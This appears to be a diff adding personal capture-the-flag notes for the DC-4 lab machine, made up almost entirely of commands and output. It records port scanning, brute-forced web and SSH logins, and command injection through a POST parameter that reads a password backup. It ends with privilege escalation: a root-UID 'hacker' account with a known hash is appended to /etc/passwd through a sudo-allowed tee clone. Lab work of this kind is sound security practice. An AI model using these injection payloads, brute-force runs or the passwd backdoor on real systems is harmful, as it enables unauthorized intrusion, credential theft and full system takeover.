@@ -1,0 +1,122 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.152.195 > PGP_DC-4.txt
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
+80/tcp open  http    nginx 1.15.10
+|_http-title: System Tools
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.15.10
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+brute-force
+admin:happy
+
+$ gobuster dir -u http://192.168.152.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+
+Found command.php
+Run Command:
+List Files
+Disk Usage
+Disk Free
+
+You have selected: ls -l
+ 
+total 24
+-rw-r--r-- 1 root root 1783 Apr  5  2019 command.php
+drwxr-xr-x 2 root root 4096 Mar 24  2019 css
+drwxr-xr-x 2 root root 4096 Mar 24  2019 images
+-rw-r--r-- 1 root root  506 Apr  6  2019 index.php
+-rw-r--r-- 1 root root 1473 Apr  7  2019 login.php
+-rw-r--r-- 1 root root  663 Mar 24  2019 logout.php
+
+Use burpsuite
+POST /command.php HTTP/1.1
+Host: 192.168.152.195
+Content-Length: 22
+Cache-Control: max-age=0
+Accept-Language: en-GB,en;q=0.9
+Origin: http://192.168.152.195
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.152.195/command.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=h7fon4gh92bdru8j9g6mjt0mf5
+Connection: keep-alive
+
+radio=ls+-l&submit=Run
+
+# change payload to enumerate
+radio=cat+/home/jim/backups/old-passwords.bak&submit=Run
+# Found password list and users name
+radio=ls+/home/&submit=Run
+charles
+jim
+sam
+
+$ hydra -L users -P pass ssh://192.168.152.195 -s 22
+[22][ssh] host: 192.168.152.195   login: jim   password: jibril04
+jim:jibril04
+$ ssh jim@192.168.152.195
+The authenticity of host '192.168.152.195 (192.168.152.195)' can't be established.
+ED25519 key fingerprint is: SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.152.195' (ED25519) to the list of known hosts.
+jim@192.168.152.195's password: 
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
+jim@dc-4:~$ id
+uid=1002(jim) gid=1002(jim) groups=1002(jim)
+
+Linux version 4.9.0-3-686 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19)
+Sudo version 1.8.19p1
+
+jim@dc-4:/var/mail$ cat jim
+Found cred: Charles:^xHhA&hvim0y
+
+jim@dc-4:/$ su charles
+Password: 
+charles@dc-4:/$ id
+uid=1001(charles) gid=1001(charles) groups=1001(charles)
+
+charles@dc-4:/$ sudo -l
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+    
+# GTFO: echo DATA | tee /path/to/output-file
+
+charles@dc-4:/$ teehee --help
+Usage: teehee [OPTION]... [FILE]...
+Copy standard input to each FILE, and also to standard output.
+
+  -a, --append              append to the given FILEs, do not overwrite
+  
+$ openssl passwd -1 -salt salt password123
+$1$salt$/3NHsNrNmNbOO90IOW9dw/
+echo 'hacker:$1$salt$/3NHsNrNmNbOO90IOW9dw/:0:0:root:/root:/bin/bash' | sudo teehee -a /etc/passwd
+
+charles@dc-4:/$ cat /etc/passwd
+hacker:$1$salt$/3NHsNrNmNbOO90IOW9dw/:0:0:root:/root:/bin/bash
+
+charles@dc-4:/$ su hacker
+Password: 
+root@dc-4:/# id
+uid=0(root) gid=0(root) groups=0(root)
